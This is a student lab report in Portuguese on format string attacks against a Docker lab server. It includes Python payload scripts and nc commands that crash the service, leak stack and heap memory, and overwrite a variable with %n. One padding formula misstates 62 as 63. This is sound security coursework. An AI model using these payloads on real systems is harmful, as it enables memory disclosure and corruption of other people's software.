# Semana 7 - Format String Attack

## Task 1 - Crashing the Program

Depois de dar setup deste lab e com o servidor pronto para receber uma mensagem, através do docker, temos como missão crashar o servidor.<br>
Para tal como é referido no guião, o servidor aguenta até 1500 bytes de dados, portanto, para o servidor crashar, precisamos de escrever mais de 1500 bytes de dados para o servidor.<br>
Para fazer isso criamos um ficheiro `badfile` que irá conter a mensagem para enviar para o servidor, e utilizamos o `build_string.py` que contém um script em python para escrever a mensagem para o ficheiro `badfile`.

O `build_string.py` contém o seguinte código:

```py
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1501
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with 12 of "%.8x", concatenated with a "%n"
s = "%.8x"*12 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

Com o ficheiro pronto para ser enviado, basta enviar a mensagem para o servidor, através do seguinte comando:

`cat badfile | nc 10.9.0.5 9090`

![image](Semana_7/images/image.png)

Com isto, o servidor não respondeu com **(^\_^)(^\_^)  Returned properly (^\_^)(^\_^)**, o que significa que crashou.

## Task 2 - Printing Out the Server Program’s Memory

### Task 2.A  - Stack Data

Para realizar esta task, alteramos o ficheiro `build_string.py` para escrever um inteiro de 4 bytes e 64 %x. O ficheiro ficou assim:

```py
#!/usr/bin/python3
import sys

N = 1000
content = bytearray(0x0 for i in range(N))


number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')


s = "%.8x"*64

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

Agora, basta correr o `build_string.py` para criar o `badfile` e rodar o comando:

`cat badfile | nc 10.9.0.5 9090`

E obtemos a seguinte resposta:

![image](Semana_7/images/image2.png)

Como podemos observar, o nosso inteiro **0xbfffeeee** foi printado no terminal após 64 bytes.

### Task 2.B - Heap Data

No server printout, é referido que a mensagem secreta está no endereço `0x080b4008` portanto temos que alterar o ficheiro `build_string.py` para ficar desta forma:

```py
#!/usr/bin/python3
import sys

N = 1000
content = bytearray(0x0 for i in range(N))

number  =  0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x"*63 + "%s"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt


with open('badfile', 'wb') as f:
  f.write(content)
```

Alteramos o input para o servidor ler o que está no endereço `0x080b4008`, escrever as próximas 63 posições e finalmente escrever em formato string o que estava no endereço dado no input.

![image](Semana_7/images/image3.png)

Concluímos que a mensagem secreta é **A secret message**

## Task 3 - Modifying the Server Program’s Memory

### Task 3.A - Change the value to a different value

Para agora mudar a variável `target`, que está no endereço `0x080e5068` podemos fazer o que fizemos na task passada, mas mudar o endereço passado como input e, em vez de adicionar um `%s` ao final, podemos adicionar um `%n`, que vai escrever o número de caracteres lidos no endereço passado no input.<br>

O `build_string.py` ficou assim:

```py
#!/usr/bin/python3
import sys

N = 1000
content = bytearray(0x0 for i in range(N))

number  =  0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x"*63 + "%n"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt


with open('badfile', 'wb') as f:
  f.write(content)
```

![image](Semana_7/images/image4.png)

Como podemos observar, a variável `target` ficou com o valor **0x000001fc**, e inicialmente era **11223344**

## Task 3.B - Change the value to 0x5000

Agora, como queremos mudar a variável `target` para `0x5000` podemos usar a mesma approach que usamos na task anterior, mas o `%n` terá que escrever o valor `0x5000`, ou seja, terá que ler 20480 bytes, 0x5000 em decimal.<br>
Para fazer isso, podemos utilizar a notação `.NX`, onde **N** é 20480 - 4 - 63*8 = 19980.<br>

Portanto s fica: `"%.19980x" + "%.8x"*62 + "%n"`<br>

Quando enviamos a mensagem ao servidor observamos o seguinte:

![image](Semana_7/images/image5.png)

Como podemos ver, a variável `target` ficou com valor **0x5000**.
